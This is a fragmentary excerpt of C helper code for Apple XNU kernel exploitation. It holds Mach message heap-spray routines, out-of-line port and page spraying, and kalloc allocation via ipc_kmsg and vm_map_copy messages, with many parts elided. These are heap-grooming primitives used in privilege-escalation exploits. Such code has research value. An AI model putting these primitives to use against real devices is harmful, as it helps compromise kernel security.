...
mach_message_size_for_ipc_kmsg_size(size_t ipc_kmsg_size) {
    ...
    // Thanks Ian!
    return ((3 * ipc_kmsg_size) / 4) - 0x74 - 0x04;
}
...
mach_message_spray_custom(mach_port_t *holding_ports, size_t *holding_port_count,
    ...
    while (current_count < total_count) {
        ...
        kern_return_t kr = mach_msg(
                ...
                MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            util_error("%s returned %d: %s", "mach_msg", kr, mach_error_string(kr));
            send_failure = true;
        }
        // If the message failed to send, then we'll move on to the next port without
    ...
    for (size_t port_index = 0; port_index < holding_port_count; port_index++) {
        ...
        mach_port_drain_messages(holding_ports[port_index], ^(mach_msg_header_t *header) {
            ...
            if (message->header.msgh_id != 'olps') {
                util_warning("Received unexpected message id 0x%x",
                        message->header.msgh_id);
                goto done;
            }
            if (!MACH_MSGH_BITS_IS_COMPLEX(message->header.msgh_bits)) {
                util_warning("Skipping non-complex message");
                goto done;
            }
            ...
            for (size_t i = 0; i < message->body.msgh_descriptor_count; i++) {
                ...
                switch (d->type.type) {
                    case MACH_MSG_OOL_PORTS_DESCRIPTOR:
                        ...
                        break;
                    default:
                        util_warning("Unexpected descriptor type %u",
                                d->type.type);
                        goto done;
                }
...
mach_ports_destroy(mach_port_t *ports, size_t count) {
    for (size_t i = 0; i < count; i++) {
        ...
        if (MACH_PORT_VALID(port)) {
            ...
            if (kr != KERN_SUCCESS) {
                util_error("%s: %s returned %d: %s", __func__, "mach_port_destroy",
...
mach_ports_deallocate(mach_port_t *ports, size_t count) {
    for (size_t i = 0; i < count; i++) {
        ...
        if (MACH_PORT_VALID(port)) {
            ...
            if (kr != KERN_SUCCESS) {
                util_error("%s: %s returned %d: %s", __func__, "mach_port_deallocate",
                        kr, mach_error_string(kr));
            }
        }
        ports[i] = MACH_PORT_DEAD;
...
struct simple_msg* receive_message(mach_port_t source, mach_msg_size_t size) {
    ...
    if (ret) {
        util_error("failed to receive message");
        return NULL;
    }
...
int send_ool_ports(mach_port_t where, mach_port_t target_port, int count, int disposition) {
    ...
    if (ret) {
        util_error("Failed to send OOL message: 0x%x (%s)", ret, mach_error_string(ret));
        return KERN_FAILURE;
    }
...
// 只在ool pages的头部放入有效port，note 当count == 0时，实际上会分配零内存页，很有用
int spray_ool_pages(mach_port_t where, size_t alloc_size, mach_port_t *target_ports, int count, int disposition)
{
    kern_return_t ret;
    uint32_t capacity;

    capacity = alloc_size / sizeof(uintptr_t);
    assert(count <= capacity);
    mach_port_t* ports = malloc(sizeof(mach_port_t) * capacity);
    for (int i = 0; i < count; i++) {
        ports[i] = target_ports[i];
    }
...
{
    struct simple_msg *msg = (struct simple_msg *)buffer;
    mach_msg_size_t data_size = (mach_msg_size_t)mach_message_size_for_ipc_kmsg_size(size);

    memset(msg, 0, sizeof(msg->hdr));

    msg->hdr.msgh_remote_port = destination;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = data_size;
    msg->hdr.msgh_id = 'dlak'; // "kald"

    kern_return_t ret = mach_msg(&msg->hdr, MACH_SEND_MSG, data_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
...
struct vm_map_copy_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool_memory;
    mach_msg_max_trailer_t trailer;
};

kern_return_t ipc_kmsg_kalloc_with_data_ool_data(mach_port_t destination, void *buffer, size_t size, void *ool_data, size_t ool_size)
{
    struct vm_map_copy_msg *msg = (struct vm_map_copy_msg *)buffer;
    mach_msg_size_t data_size = (mach_msg_size_t)mach_message_size_for_ipc_kmsg_size(size);
    ...
    msg->hdr.msgh_size = data_size;
    msg->hdr.msgh_id = 'tyb1'; // "1byt"
    msg->body.msgh_descriptor_count = 1;
    msg->ool_memory.type       = MACH_MSG_OOL_DESCRIPTOR;
    msg->ool_memory.address    = ool_data;
    msg->ool_memory.deallocate = FALSE;
    msg->ool_memory.copy       = MACH_MSG_VIRTUAL_COPY;
    msg->ool_memory.size       = ool_size;
...
mach_port_t new_mach_port(void)
{
    ...
    if (ret) {
        util_error("failed to insert right");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    ...
    if (ret) {
        util_error("failed to increase queue limit");
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
